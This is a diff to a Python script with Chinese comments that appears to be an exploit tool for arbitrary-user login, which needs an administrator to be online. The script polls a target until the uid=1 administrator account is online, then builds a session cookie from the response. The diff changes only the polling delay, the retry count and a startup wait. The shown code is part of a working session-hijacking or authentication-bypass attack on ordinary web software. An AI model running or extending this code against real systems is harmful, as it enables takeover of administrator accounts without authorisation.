@@ -19,16 +19,16 @@ def Valid_login(host): ## 有效的任意用户登录 需要管理员在线
         pass
 
 def Valid_startlogin(host): ## 监控uid=1登录用户
-    print('[->] 3秒一次测试用户是否在线（检测五次如果需要长时间检测请修改relogin.py）')
+    print('[->] 1秒一次测试用户是否在线（检测三次如果需要长时间检测请修改relogin.py）')
     i = 0
     try:
         while True:
             response = requests.get(url=host,timeout=2)
             if 'RELOGIN' in response.text and response.status_code == 200:
                 print(' [-] 目标用户处于下线状态\n ' + time.asctime())
-                time.sleep(3)
+                time.sleep(1)
                 i += 1
-                if i == 5:
+                if i == 3:
                     break
             else:
                 cookie_key = response.cookies.keys()[0]  ## 拼接cookie
@@ -41,5 +41,5 @@ def Valid_startlogin(host): ## 监控uid=1登录用户
         pass
 
 def run(host):
-    time.sleep(6)
+    time.sleep(9)
     Valid_login(host)
